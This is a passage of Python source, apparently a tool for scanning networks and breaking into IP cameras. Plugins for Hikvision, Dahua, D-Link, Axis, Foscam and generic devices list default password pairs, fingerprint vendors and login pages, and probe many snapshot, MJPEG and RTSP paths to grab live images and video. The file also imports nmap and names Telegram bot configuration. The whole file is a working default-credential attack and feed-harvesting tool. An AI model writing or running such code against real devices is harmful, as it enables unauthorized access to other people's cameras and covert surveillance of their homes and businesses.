import random
import urllib3
import nmap
import cv2
import time
import socket
import threading
import requests
import tempfile
import os
import math
import tkinter as tk
import numpy as np 
from tkinter import messagebox, scrolledtext, ttk
from PIL import Image, ImageTk
from requests.auth import HTTPBasicAuth
import gc
import glob
from threading import Thread, Event
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup
from urllib.parse import urljoin

import json
import subprocess
import asyncio
import sys
from tkinter import simpledialog
import os.path
from tkinter import ttk, messagebox
import traceback

TELEGRAM_CONFIG_FILE = "telegram_configs.json"
LAST_USED_CONFIG_FILE = "telegram_last_config.txt"
active_bot_process = None

def format_camera_display(ip, camera_data):
    """Format camera display string with IP and vendor information"""
    vendor = camera_data.get('vendor', 'unknown')
    
    vendor_display = vendor.replace('_', ' ').capitalize() if vendor else 'Unknown'
    return f"{ip} ({vendor_display})"

def extract_ip_from_display(display_string):
    """Extract IP from formatted display string"""
    if display_string and " (" in display_string:
        return display_string.split(" (")[0]
    return display_string  

class CameraVendorPlugin:
    """Базовий клас для плагіна виробника камер"""
    def __init__(self, name, priority=10):
        self.name = name
        self.priority = priority
        
    def get_auth_methods(self):
        """Повертає список можливих методів автентифікації"""
        return []
        
    def get_credentials(self):
        """Повертає потенційні облікові дані"""
        return []
        
    def get_paths(self, stream_type):
        """Повертає можливі шляхи для потоків"""
        return []
        
    def detect_vendor(self, response):
        """Визначає, чи відповідь відповідає цьому виробнику"""
        return False
        
    def find_media_urls(self, session, base_url, auth):
        """Шукає URL медіа для цього виробника"""
        photo_url = None
        video_url = None
        
        
        def try_url(url, check_image=True):
            try:
                if check_image:
                    
                    r = session.get(url, timeout=1.5, verify=False, auth=auth)
                    if r.status_code == 200 and 'image' in r.headers.get('Content-Type', ''):
                        if len(r.content) > 2000:
                            return url
                else:
                    
                    r = session.get(url, timeout=1.5, verify=False, auth=auth, stream=True)
                    if r.status_code == 200:
                        content_type = r.headers.get('Content-Type', '').lower()
                        if ('multipart' in content_type or 'stream' in content_type or 
                            'video' in content_type):
                            return url
            except:
                pass
            return None
        
        
        for path in self.get_paths("photo"):
            url = f"{base_url}{path}"
            result = try_url(url, check_image=True)
            if result:
                photo_url = result
                break
        
        
        for path in self.get_paths("video"):
            url = f"{base_url}{path}"
            result = try_url(url, check_image=False)
            if result:
                video_url = result
                break
        
        
        if not photo_url and self.__class__.__name__ != "GenericVendorPlugin":
            registry = VendorRegistry()
            generic_plugin = registry.get_vendor_by_name("generic")
            if generic_plugin:
                for path in generic_plugin.get_paths("photo"):
                    url = f"{base_url}{path}"
                    result = try_url(url, check_image=True)
                    if result:
                        photo_url = result
                        break
        
        
        if not video_url and self.__class__.__name__ != "GenericVendorPlugin":
            registry = VendorRegistry()
            generic_plugin = registry.get_vendor_by_name("generic")
            if generic_plugin:
                for path in generic_plugin.get_paths("video"):
                    url = f"{base_url}{path}"
                    result = try_url(url, check_image=False)
                    if result:
                        video_url = result
                        break
        
        return photo_url, video_url

    def is_login_page(self, response):
        """Перевіряє, чи є поточна сторінка формою логіну"""
        if response is None:
            return False
        
        
        if response.status_code == 401:
            return True
        
        content = response.text.lower()
        
        
        login_indicators = [
            
            '<form', 'input type="password"', 'type="password"', 'name="password"',
            'name="username"', 'name="login"', 'id="password"', 'id="username"',
            'id="login"', 'name="user"', 'id="user"', 'name="pass"', 'id="pass"',
            
            'login', 'username', 'password', 'sign in', 'log in', 'enter',
            'authorization', 'authentication', 'credentials', 'user login',
            'admin login', 'login page', 'please log in', 'please login',
            'user authentication', 'авторизация', 'вход в систему'
        ]
        
        
        indicators_found = sum(1 for ind in login_indicators if ind in content)
        if indicators_found >= 2:
            return True
        
        
        from bs4 import BeautifulSoup
        try:
            soup = BeautifulSoup(content, 'html.parser')
            forms = soup.find_all('form')
            for form in forms:
                
                password_fields = form.find_all('input', {'type': 'password'})
                if password_fields:
                    
                    return True
        except:
            pass
        
        return False

class VendorRegistry:
    _instance = None
    
    def __new__(cls):
        if cls._instance is None:
            cls._instance = super(VendorRegistry, cls).__new__(cls)
            cls._instance.vendors = []
        return cls._instance
    
    def register_vendor(self, vendor_plugin):
        self.vendors.append(vendor_plugin)
        
        self.vendors.sort(key=lambda x: x.priority, reverse=True)
        
    def get_all_credentials(self):
        """Повертає всі облікові дані від усіх плагінів"""
        all_creds = []
        for vendor in self.vendors:
            all_creds.extend(vendor.get_credentials())
        return list(dict.fromkeys(all_creds))  
    
    def get_vendor_by_name(self, name):
        """Отримати плагін виробника за назвою"""
        for vendor in self.vendors:
            if vendor.name == name:
                return vendor
        return None
    
    def detect_vendor(self, session, base_url):
        """Визначити виробника за відповіддю сервера"""
        try:
            response = session.get(f"{base_url}/", timeout=2.0, verify=False)
            
            
            for vendor in self.vendors:
                if vendor.detect_vendor(response):
                    return vendor.name
        except:
            pass
        return "generic"


class HikvisionPlugin(CameraVendorPlugin):
    def __init__(self):
        super().__init__("hikvision", priority=100)
        
    def get_credentials(self):
        return [
            ("admin", "12345"),
            ("admin", "admin12345"),
            ("admin", ""),
            ("admin", "admin"),
            ("admin", "888888")
        ]
            
    def get_paths(self, stream_type):
        if stream_type == "photo":
            return [
                "/ISAPI/Streaming/Channels/1/picture",
                "/ISAPI/Streaming/Channels/101/picture",
                "/onvif-http/snapshot",
                "/Streaming/Channels/1/picture",
                "/Streaming/Channels/101/picture",
                
                "/ISAPI/Streaming/channels/2/picture",
                "/ISAPI/Streaming/channels/102/picture",
                "/Streaming/Channels/2/picture",
                "/Streaming/channels/1/picture",
                "/PSIA/Streaming/channels/1/picture",
                "/snap.jpg",
                "/cgi-bin/snapshot.cgi?channel=1"
            ]
        elif stream_type == "video":
            return [
                "/ISAPI/Streaming/Channels/101/httpPreview",
                "/Streaming/Channels/1",
                "/Streaming/Channels/101",
                
                "/ISAPI/Streaming/Channels/1/httpPreview",
                "/ISAPI/Streaming/Channels/102/httpPreview",
                "/ISAPI/Streaming/channels/1/http",
                "/ISAPI/Streaming/channels/101/http",
                "/doc/page/preview.asp",
                "/live",
                "/live.jpg",
                "/mjpeg/ch1",
                "/mjpeg/channel1"
            ]
        return []
    
    def detect_vendor(self, response):
        if response is None:
            return False
            
        
        server = response.headers.get('Server', '').lower()
        if 'hikvision' in server:
            return True
            
        
        content = response.text.lower()
        if 'hikvision' in content:
            return True
        
        return False
    
    def get_rtsp_paths(self):
        """Повертає можливі RTSP шляхи для Hikvision"""
        return [
            "/Streaming/Channels/1", 
            "/Streaming/Channels/2",
            "/Streaming/Channels/101", 
            "/Streaming/Channels/102", 
            "/Streaming/Channels/201", 
            "/Streaming/Channels/202",
            "/Streaming/Channels/301", 
            "/Streaming/Channels/302",
            "/Streaming/Channels/401", 
            "/Streaming/Channels/402",
            "/h264/ch1/main/av_stream", 
            "/h264/ch1/sub/av_stream",
            "/h264/ch2/main/av_stream", 
            "/h264/ch2/sub/av_stream",
            "/h264/ch3/main/av_stream", 
            "/h264/ch3/sub/av_stream",
            "/h264/ch4/main/av_stream", 
            "/h264/ch4/sub/av_stream",
            "/ISAPI/Streaming/channels/1", 
            "/ISAPI/Streaming/channels/2",
            "/ISAPI/Streaming/channels/101", 
            "/ISAPI/Streaming/channels/102",
            "/ISAPI/Streaming/channels/201", 
            "/ISAPI/Streaming/channels/202"
        ]

    def find_media_urls(self, session, base_url, auth):
        """Шукає URL медіа для цього виробника з резервним переходом к GenericVendorPlugin"""
        photo_url = None
        video_url = None
        
        
        
        
        for path in self.get_paths("photo"):
            try:
                url = f"{base_url}{path}"
                r = session.get(url, timeout=1.5, verify=False, auth=auth)
                
                if r.status_code == 200 and 'image' in r.headers.get('Content-Type', ''):
                    if len(r.content) > 2000:
                        photo_url = url
                        break
            except:
                continue
        
        
        for path in self.get_paths("video"):
            try:
                url = f"{base_url}{path}"
                r = session.get(url, timeout=1.5, verify=False, auth=auth, stream=True)
                
                if r.status_code == 200:
                    content_type = r.headers.get('Content-Type', '').lower()
                    if ('multipart' in content_type or 'stream' in content_type or 
                        'video' in content_type):
                        video_url = url
                        break
            except:
                continue
        
        
        if not photo_url:
            registry = VendorRegistry()
            generic_plugin = registry.get_vendor_by_name("generic")
            if generic_plugin:
                for path in generic_plugin.get_paths("photo"):
                    try:
                        url = f"{base_url}{path}"
                        r = session.get(url, timeout=1.5, verify=False, auth=auth)
                        
                        if r.status_code == 200 and 'image' in r.headers.get('Content-Type', ''):
                            if len(r.content) > 2000:
                                photo_url = url
                                break
                    except:
                        continue
        
        
        if not video_url:
            registry = VendorRegistry()
            generic_plugin = registry.get_vendor_by_name("generic")
            if generic_plugin:
                for path in generic_plugin.get_paths("video"):
                    try:
                        url = f"{base_url}{path}"
                        r = session.get(url, timeout=1.5, verify=False, auth=auth, stream=True)
                        
                        if r.status_code == 200:
                            content_type = r.headers.get('Content-Type', '').lower()
                            if ('multipart' in content_type or 'stream' in content_type or 
                                'video' in content_type):
                                video_url = url
                                break
                    except:
                        continue
        
        return photo_url, video_url

    def is_login_page(self, response):
        if super().is_login_page(response):
            return True
        
        
        if response and response.text:
            content = response.text.lower()
            headers = response.headers

            
            if 'www-authenticate' in headers and 'hikvision' in headers.get('www-authenticate', '').lower():
                return True
            
            
            hikvision_indicators = [
                'hikvision', 'hik-online', 'hikweb', 'webdvr',
                'dvs-webservice', 'ipcam', 'hikvision login',
                'hikvision digital technology', 'web network camera',
                'dvr/nvr', 'ipc/ip camera', 'webcamera', 'web3.0',
                'hikvisionwebclient', 'hikvisionplayer',
                
                'dvr-', 'nvs-', 'ds-', 'ipc-', 'ivs-', 'isapi',
                
                'hikvision.js', 'isapi/auth.js', 'login/auth.js',
                'activex', 'webs/searchhd.js', 'webcomponents',
                
                '/ISAPI/', '/doc/page/login.asp', 'login_check',
                'username.linguageid', 'username.handle'
            ]
            
            
            for indicator in hikvision_indicators:
                if indicator in content:
                    return True

            
            if ('window.location.href="/logon.htm"' in content or 
                'document.write("please click')in content:
                return True
                    
            
            hikvision_design_elements = [
                'login_logo', 'verify_field', 'align_hikvision',
                'login_banner', 'hikvision-container'
            ]
            
            for element in hikvision_design_elements:
                if element in content:
                    return True
        
        return False

class DahuaPlugin(CameraVendorPlugin):
    def __init__(self):
        super().__init__("dahua", priority=90)
        
    def get_credentials(self):
        return [
            ("admin", "admin"),
            ("888888", "888888"),
            ("admin", ""),
            ("admin", "123456")
        ]
        
    def get_paths(self, stream_type):
        if stream_type == "photo":
            return [
                "/cgi-bin/snapshot.cgi",
                "/cgi-bin/snapshot.cgi?channel=1",
                "/cgi-bin/snapshot.cgi?chn=0",
                
                "/snapshot/snapshot.cgi",
                "/cgi-bin/image.cgi",
                "/cgi-bin/getpic.cgi",
                "/cgi-bin/snapshot.fcgi",
                "/cgi-bin/images.cgi",
                "/cgi-bin/snapshot.cgi?ch=1",
                "/cgi-bin/jpeg.cgi",
                "/cgi-bin/snapshot.cgi?channel=0",
                "/snapshots/video.jpg"
            ]
        elif stream_type == "video":
            return [
                "/cgi-bin/mjpg/video.cgi?channel=1",
                "/cam/realmonitor?channel=1&subtype=0",
                "/cgi-bin/video.cgi",
                
                "/cgi-bin/mjpeg.cgi",
                "/cgi-bin/video.mjpg",
                "/mjpg/video.cgi",
                "/cgi-bin/mjpg/video.cgi?channel=0",
                "/cgi-bin/video.cgi?channel=1",
                "/cgi-bin/mjpegstream.cgi",
                "/cgi-bin/video.cgi?channel=0",
                "/cgi-bin/mjpg/video.cgi?channel=1&fps=15",
                "/cgi-bin/videostream.cgi",
                "/videostream.cgi",
                "/cgi-bin/video_stream.cgi"
            ]
        return []
    
    def detect_vendor(self, response):
        if response is None:
            return False
            
        server = response.headers.get('Server', '').lower()
        if 'dahua' in server:
            return True
            
        content = response.text.lower()
        if 'dahua' in content:
            return True
        
        return False
    
    def get_rtsp_paths(self):
        """Повертає можливі RTSP шляхи для Dahua"""
        return [
            "/cam/realmonitor?channel=1&subtype=0", 
            "/cam/realmonitor?channel=1&subtype=1",
            "/cam/realmonitor?channel=2&subtype=0", 
            "/cam/realmonitor?channel=2&subtype=1",
            "/cam/realmonitor?channel=3&subtype=0", 
            "/cam/realmonitor?channel=3&subtype=1",
            "/cam/realmonitor?channel=4&subtype=0", 
            "/cam/realmonitor?channel=4&subtype=1",
            "/realmonitor", 
            "/video1", 
            "/video2", 
            "/video.sdp"
        ]
    
    def find_media_urls(self, session, base_url, auth):
        """Шукає URL медіа для цього виробника з резервним переходом к GenericVendorPlugin"""
        photo_url = None
        video_url = None
        
        
        
        
        for path in self.get_paths("photo"):
            try:
                url = f"{base_url}{path}"
                r = session.get(url, timeout=1.5, verify=False, auth=auth)
                
                if r.status_code == 200 and 'image' in r.headers.get('Content-Type', ''):
                    if len(r.content) > 2000:
                        photo_url = url
                        break
            except:
                continue
        
        
        for path in self.get_paths("video"):
            try:
                url = f"{base_url}{path}"
                r = session.get(url, timeout=1.5, verify=False, auth=auth, stream=True)
                
                if r.status_code == 200:
                    content_type = r.headers.get('Content-Type', '').lower()
                    if ('multipart' in content_type or 'stream' in content_type or 
                        'video' in content_type):
                        video_url = url
                        break
            except:
                continue
        
        
        if not photo_url:
            registry = VendorRegistry()
            generic_plugin = registry.get_vendor_by_name("generic")
            if generic_plugin:
                for path in generic_plugin.get_paths("photo"):
                    try:
                        url = f"{base_url}{path}"
                        r = session.get(url, timeout=1.5, verify=False, auth=auth)
                        
                        if r.status_code == 200 and 'image' in r.headers.get('Content-Type', ''):
                            if len(r.content) > 2000:
                                photo_url = url
                                break
                    except:
                        continue
        
        
        if not video_url:
            registry = VendorRegistry()
            generic_plugin = registry.get_vendor_by_name("generic")
            if generic_plugin:
                for path in generic_plugin.get_paths("video"):
                    try:
                        url = f"{base_url}{path}"
                        r = session.get(url, timeout=1.5, verify=False, auth=auth, stream=True)
                        
                        if r.status_code == 200:
                            content_type = r.headers.get('Content-Type', '').lower()
                            if ('multipart' in content_type or 'stream' in content_type or 
                                'video' in content_type):
                                video_url = url
                                break
                    except:
                        continue
        
        return photo_url, video_url

    def is_login_page(self, response):
        if super().is_login_page(response):
            return True
        
        
        if response and response.text:
            content = response.text.lower()
            headers = response.headers
            
            
            if 'server' in headers and 'dahua' in headers.get('server', '').lower():
                if response.status_code == 401:
                    return True
            
            
            dahua_indicators = [
                'dahuatech', 'dahua technology', 'dh_', 'dss_', 
                'lechange', 'dahuaipc', 'dahuadvr', 'dahuacamera',
                'dahua web', 'web3.0', 'loginuser', 'loginpassword',
                
                'dh.login', 'dhlogin', 'dhlogincss', 'dahua.js',
                'dh_login_msg', 'dhLoginUI', 'dhLogin', 'dh_user',
                
                '/rci/login', '/rci/', '/cgi-bin/auth.cgi', 
                '/dahuacgi/', '/cgi-bin/configManager.cgi', 
                
                'class="dahuacss"', 'id="dhlogin"', 'name="dhuser"',
                'dss_header', 'dss_login', 'dahua_login_container',
                
                'dh_ver', 'dss_ver', 'lechange_ver',
                
                'please input username', 'please input password',
                'login failed too many times'
            ]
            
            for indicator in dahua_indicators:
                if indicator in content:
                    return True
                    
            
            if ("rci.xm" in content and "login.htm" in content) or "DHLoginUI" in content:
                return True
        
        return False

class DLinkPlugin(CameraVendorPlugin):
    def __init__(self):
        super().__init__("dlink", priority=80)
        
    def get_credentials(self):
        return [
            ("admin", ""),
            ("admin", "admin"),
            ("admin", "operato"),
            ("user", "user")
        ]
        
    def get_paths(self, stream_type):
        if stream_type == "photo":
            return [
                "/image/jpeg.cgi",
                "/image.jpg",
                "/jpg/image.jpg",
                "/dms?nowprofileid=1"
            ]
        elif stream_type == "video":
            return [
                "/live.sdp",
                "/video.cgi",
                "/video/mjpg.cgi",
                "/mjpeg.cgi"
            ]
        return []
    
    def detect_vendor(self, response):
        if response is None:
            return False
            
        server = response.headers.get('Server', '').lower()
        if 'dlink' in server or 'd-link' in server:
            return True
            
        content = response.text.lower()
        if 'dlink' in content or 'd-link' in content or 'dcs-' in content:
            return True
        
        return False
    
    def get_rtsp_paths(self):
        """Повертає можливі RTSP шляхи для D-Link"""
        return [
            "/live1.sdp", 
            "/live2.sdp", 
            "/live.sdp", 
            "/play1.sdp", 
            "/play2.sdp",
            "/av0_0", 
            "/av0_1", 
            "/av1_0", 
            "/av1_1",
            "/mpeg4", 
            "/mpeg4/1/media.amp", 
            "/mpeg4/media.amp",
            "/h264", 
            "/h264/media.amp", 
            "/video1.sdp", 
            "/video2.sdp"
        ]
    
    def find_media_urls(self, session, base_url, auth):
        """Шукає URL медіа для цього виробника з резервним переходом к GenericVendorPlugin"""
        photo_url = None
        video_url = None
        
        
        
        
        for path in self.get_paths("photo"):
            try:
                url = f"{base_url}{path}"
                r = session.get(url, timeout=1.5, verify=False, auth=auth)
                
                if r.status_code == 200 and 'image' in r.headers.get('Content-Type', ''):
                    if len(r.content) > 2000:
                        photo_url = url
                        break
            except:
                continue
        
        
        for path in self.get_paths("video"):
            try:
                url = f"{base_url}{path}"
                r = session.get(url, timeout=1.5, verify=False, auth=auth, stream=True)
                
                if r.status_code == 200:
                    content_type = r.headers.get('Content-Type', '').lower()
                    if ('multipart' in content_type or 'stream' in content_type or 
                        'video' in content_type):
                        video_url = url
                        break
            except:
                continue
        
        
        if not photo_url:
            registry = VendorRegistry()
            generic_plugin = registry.get_vendor_by_name("generic")
            if generic_plugin:
                for path in generic_plugin.get_paths("photo"):
                    try:
                        url = f"{base_url}{path}"
                        r = session.get(url, timeout=1.5, verify=False, auth=auth)
                        
                        if r.status_code == 200 and 'image' in r.headers.get('Content-Type', ''):
                            if len(r.content) > 2000:
                                photo_url = url
                                break
                    except:
                        continue
        
        
        if not video_url:
            registry = VendorRegistry()
            generic_plugin = registry.get_vendor_by_name("generic")
            if generic_plugin:
                for path in generic_plugin.get_paths("video"):
                    try:
                        url = f"{base_url}{path}"
                        r = session.get(url, timeout=1.5, verify=False, auth=auth, stream=True)
                        
                        if r.status_code == 200:
                            content_type = r.headers.get('Content-Type', '').lower()
                            if ('multipart' in content_type or 'stream' in content_type or 
                                'video' in content_type):
                                video_url = url
                                break
                    except:
                        continue
        
        return photo_url, video_url
    
    def is_login_page(self, response):
        if super().is_login_page(response):
            return True
        
        
        if response and response.text:
            content = response.text.lower()
            headers = response.headers
            
            
            if 'www-authenticate' in headers and 'd-link' in headers.get('www-authenticate', '').lower():
                return True
            
            
            dlink_indicators = [
                
                'd-link', 'dlink', 'dcs-', 'd-viewcam', 'dlink.com',
                'dlink corporation', 'd-link corporation',
                
                'name="login.html"', 'id="dlink_login"', 'class="dlink_form"',
                'dcs_login', 'dlink_auth', 'dlinkauth', 'dcs_auth',
                
                'dlink.js', 'dcs.js', 'dlink_login.js', 'dlinklogin',
                'dlinkapp', 'dlinkwebcam', 'dlinkipcam',
                
                '/login.htm', '/auth.htm', '/cgi-bin/auth.cgi',
                '/cgi/auth.cgi', '/cgi-bin/dcs_login.cgi',
                '/cgi/dcs_auth.cgi', '/live/login.html',
                
                'incorrect login information', 'invalid credentials',
                'dcs login failed', 'camera login failed'
            ]
            
            for indicator in dlink_indicators:
                if indicator in content:
                    return True
                    
            
            dlink_form_patterns = [
                'form action="login.cgi"', 'form action="auth.cgi"',
                'form action="/cgi-bin/auth.cgi"', 'form action="/login.php"',
                'dcs_login_form', 'dlink_login_form'
            ]
            
            for pattern in dlink_form_patterns:
                if pattern in content:
                    return True
                    
            
            dlink_css_classes = [
                'dcs-layout', 'dcs-login', 'dcs_container', 'dlink_header',
                'dlink_footer', 'dcs_panel', 'dlink_box', 'dcs_box'
            ]
            
            for css_class in dlink_css_classes:
                if f'class="{css_class}"' in content or f"class='{css_class}'" in content:
                    return True
        
        return False

class AxisPlugin(CameraVendorPlugin):
    def __init__(self):
        super().__init__("axis", priority=75)
    
    def get_credentials(self):
        return [
            ("root", "pass"),
            ("admin", "admin"),
            ("admin", ""),
            ("admin", "admin1234"),
            ("root", "admin")
        ]
    
    def get_paths(self, stream_type):
        if stream_type == "photo":
            return [
                "/axis-cgi/jpg/image.cgi",
                "/axis-cgi/bitmap/image.bmp",
                "/view/view.shtml"
            ]
        elif stream_type == "video":
            return [
                "/axis-cgi/mjpg/video.cgi",
                "/axis-cgi/mjpg/video.cgi?resolution=640x480",
                "/axis-cgi/mjpg/video.cgi?date=1&clock=1"
            ]
        return []
    
    def detect_vendor(self, response):
        if response is None:
            return False
        
        server = response.headers.get('Server', '').lower()
        if 'axis' in server:
            return True
        
        content = response.text.lower()
        if 'axis' in content:
            return True
        
        return False
        
    def get_rtsp_paths(self):
        return [
            "/axis-media/media.amp", 
            "/mpeg4/media.amp", 
            "/mpeg4/1/media.amp",
            "/mpeg4/2/media.amp", 
            "/mpeg4/3/media.amp", 
            "/mpeg4/4/media.amp",
            "/axis-media/media.amp?videocodec=h264", 
            "/axis-media/media.amp?videocodec=h265"
        ]
    def find_media_urls(self, session, base_url, auth):
            """Шукає URL медіа для цього виробника з резервним переходом к GenericVendorPlugin"""
            photo_url = None
            video_url = None
            
            
            
            
            for path in self.get_paths("photo"):
                try:
                    url = f"{base_url}{path}"
                    r = session.get(url, timeout=1.5, verify=False, auth=auth)
                    
                    if r.status_code == 200 and 'image' in r.headers.get('Content-Type', ''):
                        if len(r.content) > 2000:
                            photo_url = url
                            break
                except:
                    continue
            
            
            for path in self.get_paths("video"):
                try:
                    url = f"{base_url}{path}"
                    r = session.get(url, timeout=1.5, verify=False, auth=auth, stream=True)
                    
                    if r.status_code == 200:
                        content_type = r.headers.get('Content-Type', '').lower()
                        if ('multipart' in content_type or 'stream' in content_type or 
                            'video' in content_type):
                            video_url = url
                            break
                except:
                    continue
            
            
            if not photo_url:
                registry = VendorRegistry()
                generic_plugin = registry.get_vendor_by_name("generic")
                if generic_plugin:
                    for path in generic_plugin.get_paths("photo"):
                        try:
                            url = f"{base_url}{path}"
                            r = session.get(url, timeout=1.5, verify=False, auth=auth)
                            
                            if r.status_code == 200 and 'image' in r.headers.get('Content-Type', ''):
                                if len(r.content) > 2000:
                                    photo_url = url
                                    break
                        except:
                            continue
            
            
            if not video_url:
                registry = VendorRegistry()
                generic_plugin = registry.get_vendor_by_name("generic")
                if generic_plugin:
                    for path in generic_plugin.get_paths("video"):
                        try:
                            url = f"{base_url}{path}"
                            r = session.get(url, timeout=1.5, verify=False, auth=auth, stream=True)
                            
                            if r.status_code == 200:
                                content_type = r.headers.get('Content-Type', '').lower()
                                if ('multipart' in content_type or 'stream' in content_type or 
                                    'video' in content_type):
                                    video_url = url
                                    break
                        except:
                            continue
            
            return photo_url, video_url

    def is_login_page(self, response):
        """Перевіряє, чи є поточна сторінка формою логіну для Axis камер"""
        if super().is_login_page(response):
            return True
        
        
        if response and response.text:
            content = response.text.lower()
            headers = response.headers
            
            
            if 'server' in headers and 'axis' in headers.get('server', '').lower():
                if response.status_code == 401:
                    return True
            
            
            axis_indicators = [
                
                'axis communications', 'axis network camera', 'axis camera',
                'axis video server', 'axis web interface', 'acap', 'accc',
                'axis connect', 'axis companion', 'axis one click',
                
                'axisid', 'axisparamjs', 'axismvc', 'axiscam',
                'axiscamera', 'axisclient', 'axismodule',
                
                'axis-cgi', 'axis.cgi', 'view/view.shtml',
                'control/control.shtml', 'operator/operator.shtml',
                '/incl/user_login.shtml', '/axis-cgi/admin/param.cgi',
                '/axis-cgi/users.cgi', '/incl/userlogin.shtml',
                '/admin-bin/admin.cgi', '/view/indexFrame.shtml',
                
                'axis.js', 'axisuser.js', 'axisauth.js', 'axislogin.js',
                
                'axis.prototype', 'axisuser.prototype', 'axisobject',
                
                'axis user login', 'axis camera login', 'axis device login',
                'please log in', 'authorized access only',
                'authentication required for axis device',
                
                'axis-login', 'axis_login', 'axis-auth', 'axis_auth',
                'axis-credentials', 'axis_username', 'axis_password'
            ]
            
            for indicator in axis_indicators:
                if indicator in content:
                    return True
                    
            
            if 'axis-horizontal-logo' in content or 'axis-login-box' in content:
                return True
                
            
            if ('name="root.UserName"' in content or 
                'name="root.Password"' in content or 
                'name="root.Auth.User"' in content):
                return True
                    
            
            if 'axisparamjs' in content or 'axisUser' in content:
                return True
            
            
            server_header = response.headers.get('Server', '').lower()
            if 'axis' in server_header or 'acapbm' in server_header:
                return True
        
        return False

class FoscamPlugin(CameraVendorPlugin):
    def __init__(self):
        super().__init__("foscam", priority=70)
    
    def get_credentials(self):
        return [
            ("admin", ""),
            ("admin", "admin"),
            ("admin", "foscam"),
            ("admin", "123456")
        ]
    
    def get_paths(self, stream_type):
        if stream_type == "photo":
            return [
                "/snapshot.cgi?user=admin&pwd=",
                "/cgi-bin/snapshot.jpg",
                "/tmpfs/snap.jpg",
                "/tmpfs/auto.jpg"
            ]
        elif stream_type == "video":
            return [
                "/videostream.cgi?user=admin&pwd=",
                "/cgi-bin/CGIStream.cgi",
                "/cgi-bin/videostream.cgi",
                "/mjpeg.cgi"
            ]
        return []
    
    def detect_vendor(self, response):
        if response is None:
            return False
        
        server = response.headers.get('Server', '').lower()
        if 'foscam' in server or 'ipcam' in server:
            return True
        
        content = response.text.lower()
        if 'foscam' in content:
            return True
        
        return False
        
    def get_rtsp_paths(self):
        return [
            "/live/ch0",
            "/live/ch1",
            "/videoMain",
            "/videoSub",
            "/media/video1",
            "/onvif1",
            "/onvif2"
        ]
        
    def find_media_urls(self, session, base_url, auth):
        """Шукає URL медіа для цього виробника з резервним переходом к GenericVendorPlugin"""
        photo_url = None
        video_url = None
        
        
        
        
        for path in self.get_paths("photo"):
            try:
                url = f"{base_url}{path}"
                r = session.get(url, timeout=1.5, verify=False, auth=auth)
                
                if r.status_code == 200 and 'image' in r.headers.get('Content-Type', ''):
                    if len(r.content) > 2000:
                        photo_url = url
                        break
            except:
                continue
        
        
        for path in self.get_paths("video"):
            try:
                url = f"{base_url}{path}"
                r = session.get(url, timeout=1.5, verify=False, auth=auth, stream=True)
                
                if r.status_code == 200:
                    content_type = r.headers.get('Content-Type', '').lower()
                    if ('multipart' in content_type or 'stream' in content_type or 
                        'video' in content_type):
                        video_url = url
                        break
            except:
                continue
        
        
        if not photo_url:
            registry = VendorRegistry()
            generic_plugin = registry.get_vendor_by_name("generic")
            if generic_plugin:
                for path in generic_plugin.get_paths("photo"):
                    try:
                        url = f"{base_url}{path}"
                        r = session.get(url, timeout=1.5, verify=False, auth=auth)
                        
                        if r.status_code == 200 and 'image' in r.headers.get('Content-Type', ''):
                            if len(r.content) > 2000:
                                photo_url = url
                                break
                    except:
                        continue
        
        
        if not video_url:
            registry = VendorRegistry()
            generic_plugin = registry.get_vendor_by_name("generic")
            if generic_plugin:
                for path in generic_plugin.get_paths("video"):
                    try:
                        url = f"{base_url}{path}"
                        r = session.get(url, timeout=1.5, verify=False, auth=auth, stream=True)
                        
                        if r.status_code == 200:
                            content_type = r.headers.get('Content-Type', '').lower()
                            if ('multipart' in content_type or 'stream' in content_type or 
                                'video' in content_type):
                                video_url = url
                                break
                    except:
                        continue
        
        return photo_url, video_url
    
    def is_login_page(self, response):
        """Перевіряє, чи є поточна сторінка формою логіну для Foscam камер"""
        if super().is_login_page(response):
            return True
        
        
        if response and response.text:
            content = response.text.lower()
            
            
            foscam_indicators = [
                'foscam', 
                'ipcam', 
                'loginuser', 
                'loginpass',
                'webcam.cgi',
                'snapshot.cgi',
                'videostream.cgi',
                'cgi-bin/cgi',
                'foscam cloud'
            ]
            
            
            for indicator in foscam_indicators:
                if indicator in content:
                    return True
                    
            
            if ('user=' in content or 'pwd=' in content) and ('cgi' in content):
                return True
        
        return False

class GenericVendorPlugin(CameraVendorPlugin):
    def __init__(self):
        super().__init__("generic", priority=10)
        
    def get_credentials(self):
        return [
            ("admin", ""),
            ("admin", "admin"),
            ("admin", "123456"),
            ("admin", "password"),
            ("user", "user"),
            ("root", "root")
        ]
        
    def get_paths(self, stream_type):
        if stream_type == "photo":
            return [
                
                "/snapshot.jpg", "/image.jpg", "/snap.jpg", "/capture", 
                "/onvif-http/snapshot", "/cgi-bin/snapshot.cgi",
                "/picture.jpg", "/jpg/image.jpg", "/cgi-bin/viewer/video.jpg",
                "/Control/FastCgi/Still/Get", "/image/jpeg.cgi",
                "/stillimage", "/screen.jpg", "/api/snap.cgi",
                "/camera.jpg", "/stills/live.jpg", "/live/ch0",
                "/GetData.cgi", "/snapshot", "/current.jpg",
                "/image/current.jpg", "/shot.jpg", "/getimage",
                "/media/still.jpg",
                
                
                "/onvif/snapshot", "/images/snapshot.jpg", "/tmpfs/snap.jpg",
                "/tmpfs/auto.jpg", "/jpeg/current.jpg", "/jpeg/image.jpg",
                "/live/0/jpeg", "/live/1/jpeg", "/live/main/jpeg", "/live/sub/jpeg",
                "/cgi-bin/faststream.jpg", "/cgi-bin/jpg/image.cgi",
                "/cgi-bin/jpg/single.cgi", "/cgi-bin/camera/still.jpg",
                "/axis-cgi/jpg/image.cgi", "/axis-cgi/bitmap/image.bmp",
                "/view/view.shtml", "/view/view.jpg", "/view/index.shtml",
                "/view/snapshot.jpg", "/mjpg/snap.cgi", "/mjpg/snapshot.cgi",
                "/cgi/jpg/image.cgi", "/cgi/jpg/snapshot.cgi",
                "/web/auto.jpg", "/SnapshotJPEG", "/Jpeg/JpegImage",
                "/jpg/snapshot.jpg", "/cgi-bin/image.jpg", "/cam/still.jpg",
                "/cam/snapshot.jpg", "/cgi-bin/cam/still.cgi", "/cgi-bin/cam/snapshot.cgi",
                "/cgi-bin/image_snapshot.cgi", "/cgi-bin/image.cgi",
                "/capture/webCapture.jpg", "/capture.jpg", "/capture.cgi",
                "/jpg/1/image.jpg", "/jpg/2/image.jpg", "/jpg/3/image.jpg",
                "/channel1.jpg", "/channel2.jpg", "/channel3.jpg", "/channel4.jpg",
                "/Streaming/channels/1/picture", "/Streaming/channels/101/picture",
                "/Streaming/Channels/1/picture", "/Streaming/Channels/101/picture",
